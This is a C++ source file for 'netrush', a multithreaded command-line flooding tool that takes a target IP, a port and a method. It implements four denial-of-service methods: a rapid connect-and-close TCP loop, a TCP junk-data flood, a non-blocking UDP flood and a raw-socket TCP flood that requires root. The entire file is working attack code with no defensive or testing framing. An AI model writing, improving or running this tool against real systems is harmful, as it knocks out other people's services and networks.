#include <iostream>
#include <thread>
#include <vector>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <csignal>
#include <cstring>
#include <fcntl.h>

#include "argparse.hpp"

std::string dest_ip;
std::string method;

unsigned int dest_port;
unsigned int junk_length = 5;
unsigned int thread_count = 1;

std::map<std::string, void(*)()> method_map;
argparse::ArgumentParser aparser("netrush", "1.0");
sockaddr_in dest;
timeval timeout;
std::vector<std::thread> threads;

std::string alphanum = "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
int alphanum_size = alphanum.length();

// helpers

std::string rand_str(int length)
{
    std::string result;
    for (int i = 0; i < length; i++) result += alphanum[rand() % (alphanum_size - 1)];
    return result;
}

/* ------------------------- flood methods ------------------------- */

// ------- //

// do not require special privileges
void syn_flood()
{
    timeout.tv_sec = 0;
    timeout.tv_usec = 1;

    while (true)
    {
        int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sockfd < 0) std::cerr << "\nSocket creation error. Errno: " << errno;
        setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
        int connection_status = connect(sockfd, (sockaddr*) &dest, sizeof(dest));
        close(sockfd);
    }
}

// ------- //

void tcp_flood()
{
    while (true)
    {
        int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        int connection_status = connect(sockfd, (sockaddr*) &dest, sizeof(dest));

        int noDelay = 1;
        setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, &noDelay, sizeof(noDelay));

        if (connection_status == 0)
        {
            while (true)
            {
                std::string junk = rand_str(junk_length);
                send(sockfd, junk.c_str(), junk.length(), 0);
            }
        }
        else 
        {
            close(sockfd);
            std::cerr << "Connection error. Errno: " << errno;
            exit(1);
        }
    }
}

// ------- //

void udp_flood()
{
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        std::cerr << "Socket creation error. Errno: " << errno << "\n";
        exit(1);
    }

    int flags = fcntl(sockfd, F_GETFL, 0);
    fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);

    while (true)
    {
        std::string junk = rand_str(junk_length);
        int sent_bytes = sendto(sockfd, junk.c_str(), junk.length(), 0, (const struct sockaddr *) &dest, sizeof(dest));
    }
    
    close(sockfd);
}

// ------- //

// root required
void raw_tcp_flood()
{
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        std::cerr << "Socket creation error. Errno: " << errno << "\n";
        exit(1);
    }

    while (true)
    {
        std::string junk = rand_str(junk_length);
        int sent_bytes = sendto(sockfd, junk.c_str(), junk.length(), 0, (const struct sockaddr *) &dest, sizeof(dest));
    }
    
    close(sockfd);
}

/* ----------------------------------------------------------------- */

int main(int argc, char* argv[])
{
    /* startup */

    // normal methods
    method_map["utcpsyn"] = syn_flood;
    method_map["utcpflood"] = tcp_flood;
    method_map["uudpflood"] = udp_flood;

    // root-required methods
    method_map["rtcpflood"] = raw_tcp_flood;

    // required arguments
    aparser.add_argument("-I", "--ip").store_into(dest_ip).required().help("target IPv4 address.");
    aparser.add_argument("-P", "--port").store_into(dest_port).required().help("target port.");
    aparser.add_argument("-M", "--method").store_into(method).required().help("flood method.");

    // additional arguments
    aparser.add_argument("-J", "--junk-length").store_into(junk_length).help("length of the junk data that will be sent while raw_tcp_flood. (default: 5)");
    aparser.add_argument("-T", "--threads").store_into(thread_count).help("thread count (default: 1).");

    aparser.parse_args(argc, argv);

    std::cout << "Initialization...\n";

    /* ------------------------------------ */
    
    dest.sin_family = AF_INET;
    dest.sin_port = htons(dest_port);
    inet_pton(AF_INET, dest_ip.c_str(), &dest.sin_addr);

    if (method_map.find(method) == method_map.end())
    {
        std::cerr << "Unknown method. Quitting.\n";
        return 1;
    }

    /* ------------------------------------ */

    std::cout << "Flooding now.\n";

    /* ------------------------------------ */

    for (int i = 0; i < thread_count; i++) threads.emplace_back(method_map[method]);
    for (std::thread &t : threads) t.join();

    /* ------------------------------------ */
    return 0;
}